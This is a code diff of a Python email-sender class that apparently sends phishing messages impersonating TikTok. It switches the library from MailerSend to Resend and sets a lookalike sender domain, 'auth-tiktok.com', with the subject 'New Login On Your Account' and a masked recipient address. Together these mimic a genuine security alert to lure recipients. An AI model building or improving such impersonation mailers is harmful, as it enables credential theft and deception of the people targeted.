@@ -1,16 +1,15 @@
-from mailersend import emails
+import resend
 from dotenv import load_dotenv
 import os
 from datetime import datetime
 
 load_dotenv()
 
-MAIL_FROM = {
-    "name": "TikTok",
-    "email": "MS_OQ9L5U@studentvault.co.uk",
-}
+MAIL_FROM = "no-reply@auth-tiktok.com"
 
 SUBJECT = "New Login On Your Account"
+
+resend.api_key = os.getenv("RESEND_API_KEY")
 
 
 class Correo:
@@ -19,23 +18,14 @@ class Correo:
     """
 
     def __init__(self, recipient_address):
-        self.mailer = emails.NewEmail(os.getenv("MAILERSEND_API_KEY"))
-        self.mail_body = {}
         self.mail_from = MAIL_FROM
         self.subject = SUBJECT
         self.recipient_address = recipient_address
         self.recipient = [
             {"email": recipient_address}
         ]  # special formatting for MailerSend API
-        self.template = ""
 
-        self.__set_attributes()  # at this point, email is ready to go
-
-    def __set_attributes(self) -> None:
-        self.mailer.set_mail_from(self.mail_from, self.mail_body)
-        self.mailer.set_mail_to(self.recipient, self.mail_body)
-        self.mailer.set_subject(self.subject, self.mail_body)
-        self.mailer.set_html_content(self.__set_template(), self.mail_body)
+        self.__set_template()
 
     def __mask_email(self, email) -> str:
         """
@@ -62,7 +52,13 @@ class Correo:
         return self.template
 
     def send(self):
-        return self.mailer.send(self.mail_body)
+        params: resend.Emails.send = {
+            "from": self.mail_from,
+            "to": self.recipient_address,
+            "subject": self.subject,
+            "html": self.template,
+        }
+        return resend.Emails.send(params)
 
 
 def get_date():
